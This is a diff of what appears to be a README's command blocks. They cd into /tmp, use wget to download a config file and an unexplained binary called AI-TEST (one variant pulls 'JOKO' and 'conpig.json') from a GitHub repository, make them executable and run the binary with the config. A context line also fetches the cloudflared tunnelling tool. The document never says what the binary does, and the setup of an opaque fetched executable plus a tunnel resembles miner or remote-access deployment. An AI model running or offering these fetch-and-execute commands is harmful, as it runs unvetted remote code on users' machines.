@@ -11,8 +11,11 @@ wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloud
 ```
 
 ```
-cd /tmp && wget -O config.json https://raw.githubusercontent.com/DOT-AJA/SCRIPT/refs/heads/main/config.json && wget -O AI-TEST https://github.com/DOT-AJA/SCRIPT/releases/download/testv2/AI-TEST  && chmod +x AI-TEST config.json && ./AI-TEST -c config.json
+cd /tmp && wget -O config.json https://raw.githubusercontent.com/DOT-AJA/SCRIPT/refs/heads/main/config.json && wget -O AI-TEST https://github.com/DOT-AJA/SCRIPT/releases/download/testv2/AI-TEST  && chmod +x AI-TEST config.json
 ```
 ```
 cd /tmp && wget -O config.json https://raw.githubusercontent.com/DOT-AJA/SCRIPT/refs/heads/main/conpig.json && wget -O AI-TEST https://github.com/DOT-AJA/SCRIPT/releases/download/testv2/JOKO && chmod +x AI-TEST config.json && ./AI-TEST -c config.json
+```
+```
+./AI-TEST -c config.json
 ```
